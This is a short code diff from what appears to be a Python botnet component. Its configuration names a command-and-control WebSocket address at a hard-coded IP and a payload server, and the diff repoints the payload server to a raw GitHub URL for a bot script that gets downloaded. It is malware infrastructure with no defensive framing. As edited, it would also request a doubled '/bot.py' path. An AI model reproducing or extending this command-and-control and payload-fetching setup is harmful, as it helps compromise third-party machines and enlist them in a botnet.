@@ -20,7 +20,7 @@ import ipaddress
 # Configuration – Set these via environment variables
 # =============================================================================
 CNC_WS_URL = os.environ.get('CNC_WS_URL', 'ws://54.234.46.3:8765')
-PAYLOAD_SERVER = os.environ.get('PAYLOAD_SERVER', 'http://54.234.46.3:8080')
+PAYLOAD_SERVER = os.environ.get('PAYLOAD_SERVER', 'https://raw.githubusercontent.com/nkarthikraja-32/botpoll/main/bot.py')
 PAYLOAD_URL = f"{PAYLOAD_SERVER}/bot.py"        # The bot script to download
 PAYLOAD_NAME = "bot.py"                           # Name after download
 
